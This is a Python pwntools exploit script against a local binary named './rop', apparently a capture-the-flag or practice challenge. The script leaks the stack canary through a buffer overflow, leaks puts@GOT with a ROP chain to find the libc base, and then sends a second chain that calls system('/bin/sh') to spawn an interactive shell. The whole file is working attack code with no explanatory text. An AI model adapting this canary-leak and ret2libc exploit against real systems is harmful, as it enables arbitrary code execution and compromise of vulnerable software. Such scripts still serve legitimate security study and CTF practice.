from pwn import *

# Set up pwntools for either local or remote
context.binary = elf = ELF('./rop')
# context.log_level = 'debug'  # Uncomment for debugging

p = process('./rop')

def leak_canary():
    # First read - leak canary
    p.recvuntil(b'[1] Leak Canary\n')
    p.recvuntil(b'Buf: ')
    
    # Send payload that reaches up to canary
    payload = b'A' * 0x48  
    p.send(payload)
    
    # Receive output and extract canary
    p.recvuntil(b'Buf: ')
    p.recvuntil(payload)
    leaked = p.recv(7)  # Receive 7 bytes (canary has null byte at start)
    canary = u64(b'\x00' + leaked)
    log.success(f"Leaked canary: {hex(canary)}")
    return canary

# Get gadgets
pop_rdi = 0x400853  # pop rdi ; ret
ret = 0x400596      # ret

# Leak canary
canary = leak_canary()

# Build ROP chain
p.recvuntil(b'[2] Input ROP payload\n')
p.recvuntil(b'Buf: ')

# Get addresses from PLT and GOT
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# Craft final payload
payload = b'A' * 0x48                # Padding to canary
payload += p64(canary)               # Canary
payload += p64(0)                    # Saved RBP
# ROP chain to leak libc
payload += p64(pop_rdi)              # pop rdi ; ret
payload += p64(puts_got)             # puts@GOT into rdi
payload += p64(puts_plt)             # call puts
payload += p64(main)                 # return to main for second stage

p.send(payload)

# Get leaked address
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Leaked puts@GLIBC: {hex(leaked)}")

# Calculate libc base and offsets
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust path as needed
libc.address = leaked - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# Leak canary again for second stage
canary = leak_canary()

# Final payload with system('/bin/sh')
p.recvuntil(b'[2] Input ROP payload\n')
p.recvuntil(b'Buf: ')

payload = b'A' * 0x48                # Padding to canary
payload += p64(canary)               # Canary
payload += p64(0)                    # Saved RBP
# ROP chain to get shell
payload += p64(ret)                  # Stack alignment
payload += p64(pop_rdi)              # pop rdi ; ret
payload += p64(next(libc.search(b'/bin/sh'))) # /bin/sh string
payload += p64(libc.symbols['system'])  # system function

p.send(payload)

p.interactive()